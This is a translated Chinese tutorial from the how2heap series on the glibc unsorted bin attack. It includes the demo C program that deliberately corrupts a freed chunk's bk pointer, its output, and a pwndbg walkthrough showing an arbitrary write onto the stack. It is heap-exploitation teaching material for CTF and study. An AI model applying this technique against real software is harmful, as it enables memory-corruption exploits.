# how2heap之unsorted bin&&largebin
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
> 本文包括unsorted bin attack,unsorted bin into stack,large bin attck
PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂
## 参考网站
    https://ctf-wiki.github.io/ctf-wiki/pwn/
    https://www.anquanke.com/post/id/85127
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
    https://www.freebuf.com/articles/system/209096.html
    https://bbs.pediy.com/thread-223283.htm
    https://xz.aliyun.com/t/5177?accounttraceid=d0a1f6bd7256460885a64d78c885c8caznnf
    https://www.anquanke.com/post/id/183877
## 0x01 unsorted bin attack
###  序
unsoted bin attack的杀伤力虽然不够,但也是不可小视的辅助攻击方式,第一个我们就先来看unsorted bin attack吧
wiki上的[介绍](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/)
这里简要介绍一下:
在_int_malloc中有这么一段代码,他会在unsorted bin取出时被调用:
    unsorted_chunks (av)->bk = bck;
    bck->fd = unsorted_chunks (av);
那么这个bck是什么呢?
    bck = victim->bk
因此我们只需要控制bk指针就可以让bck位置可控，而我们的bck->fd也就可控了，此时就可以往任意地址写一个东西,但是写的东西不归我们控制,因此只能打辅助2333
###  源代码
这个代码真心少啊我说2333,同样的,我加了一点注释删了些东西
作者的话的大概意思:
本demo使用unsorted bin attack技巧将一个很大的无符号long型值写进了栈里
在实际中,unsorted bin attack常常用于为其他的攻击做辅助,比如覆写global_max_fast来为fastbin attack做辅助
    #include 
    #include 
    int main(){
            unsigned long stack_var=0;
            //stack_var就是我们的攻击目标
            fprintf(stderr, "Let's first look at the target we want to rewrite on stack:n");
            fprintf(stderr, "%p: %ldnn", &stack_var, stack_var);
            unsigned long *p=malloc(400);
            // 我们先在堆上分配一个正常的chunk
            fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %pn",p);
            //并且分配另一个正常的chunk来避免free第一个chunk时该chunk与top chunk合并
            fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
               "the first one during the free()nn");
            malloc(500);
            free(p);
            //现在我们释放的p将会被放入unsorted bin中,并且其bk指向p[1]
            fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
                       "point to %pn",(void*)p[1]);
            //------------VULNERABILITY-----------    
            p[1]=(unsigned long)(&stack_var-2);
            //现在我们模拟有一个漏洞让我们可以覆写victim->bk指针
            fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointern");
            fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn",(void*)p[1]);
            //------------------------------------    
            malloc(400);
            //现在我们再分配一次来取回我们刚刚free掉的chunk,此时攻击目标已经被改写了
            fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
                       "rewritten:n");
            fprintf(stderr, "%p: %pn", &stack_var, (void*)stack_var);
    }
###  运行结果
    This file demonstrates unsorted bin attack by write a large unsigned long value into stack
    In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack
    Let's first look at the target we want to rewrite on stack:
    0x7ffdabb6d048: 0
    Now, we allocate first normal chunk on the heap at: 0x16d6010
    And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()
    We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7fb225384b78
    Now emulating a vulnerability that can overwrite the victim->bk pointer
    And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffdabb6d038
    Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten:
    0x7ffdabb6d048: 0x7fb225384b78
###  调试
断点位置
       9   unsigned long stack_var=0;
     ► 10         fprintf(stderr, "Let's first look at the target we want to rewrite on stack:n");
     ► 13         unsigned long *p=malloc(400);
     ► 17   malloc(500);
       19   free(p);
     ► 20         fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
       25   p[1]=(unsigned long)(&stack_var-2);
     ► 26         fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointern");
       31   malloc(400);
     ► 32         fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
下面我们直接运行看下,首先给定义变量stack_var,赋初值为0
    pwndbg> p stack_var
    $2 = 0
    pwndbg> p &stack_var
    $3 = (unsigned long *) 0x7fffffffe5c8
下面malloc一下
    pwndbg> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6021a0 PREV_INUSE {
      prev_size = 0,
      size = 134753,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
然后malloc(500)来防止p free的时候与top chunk合并
    pwndbg> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6021a0 PREV_INUSE {
      prev_size = 0,
      size = 513,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6023a0 PREV_INUSE {
      prev_size = 0,
      size = 134241,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
然后释放p,p被插入到unsortedbin中
    pwndbg> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x7ffff7dd1b78 ,
      bk = 0x7ffff7dd1b78 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
    smallbins
    empty
    largebins
    empty
此时的p[1]
    pwndbg> p/x p[1]
    $5 = 0x7ffff7dd1b78
    pwndbg> x/10gx p[1]
    0x7ffff7dd1b78 : 0x00000000006023a0      0x0000000000000000
    0x7ffff7dd1b88 :        0x0000000000602000      0x0000000000602000
    0x7ffff7dd1b98 :        0x00007ffff7dd1b88      0x00007ffff7dd1b88
    0x7ffff7dd1ba8 :        0x00007ffff7dd1b98      0x00007ffff7dd1b98
    0x7ffff7dd1bb8 :        0x00007ffff7dd1ba8      0x00007ffff7dd1ba8
然后给p[1]赋值
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 417,
      fd = 0x7ffff7dd1b78 ,
      bk = 0x7fffffffe5b8,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all [corrupted]
    FD: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
    BK: 0x602000 —▸ 0x7fffffffe5b8 —▸ 0x602010 ◂— 0x0
    smallbins
    empty
    largebins
    empty
可以看到,我们的bk指针已经被修改为了&stack-2的位置,也就是
    pwndbg> p &stack_var
    $13 = (unsigned long *) 0x7fffffffe5c8
    pwndbg> p/x  0x7fffffffe5c8- 0x7fffffffe5b8
    $14 = 0x10
然后我们取出我们的unsorted bin
    pwndbg> p/x stack_var
    $15 = 0x7ffff7dd1b78
可以看到我们的var_stack的值已经被写成了我们unsortedbin(av)的值了